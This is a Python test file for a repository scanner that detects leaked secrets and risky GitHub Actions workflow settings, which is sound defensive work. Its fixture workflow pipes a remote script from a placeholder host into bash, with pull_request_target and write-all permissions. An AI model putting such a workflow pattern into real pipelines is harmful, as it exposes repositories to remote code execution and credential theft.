from __future__ import annotations

from scripts.scan_quarantined_repositories import (
    scan_secret_indicators,
    scan_workflow_indicators,
)


def test_secret_scan_reports_rule_and_line_without_emitting_value() -> None:
    sentinel = "ghp_" + ("A" * 40)
    findings = scan_secret_indicators(f'# placeholder\nTOKEN="{sentinel}"')
    assert findings
    assert findings[0]["line"] == 2
    rendered = repr(findings)
    assert sentinel not in rendered
    assert "TOKEN" not in rendered


def test_workflow_scan_flags_unpinned_and_privileged_patterns() -> None:
    content = """name: example
on: pull_request_target
permissions: write-all
jobs:
  scan:
    steps:
      - uses: actions/checkout@v4
      - run: curl https://example.invalid/install.sh | bash
"""
    findings = scan_workflow_indicators(content)
    rules = {item["rule"] for item in findings}
    assert {
        "PULL_REQUEST_TARGET",
        "WRITE_ALL_PERMISSIONS",
        "ACTION_REF_NOT_SHA_PINNED",
        "REMOTE_SCRIPT_PIPE_TO_SHELL",
    }.issubset(rules)


def test_workflow_scan_flags_persisted_checkout_credentials() -> None:
    findings = scan_workflow_indicators("      persist-credentials: true\n")
    assert findings == [{"line": 1, "rule": "CHECKOUT_CREDENTIAL_PERSISTENCE"}]
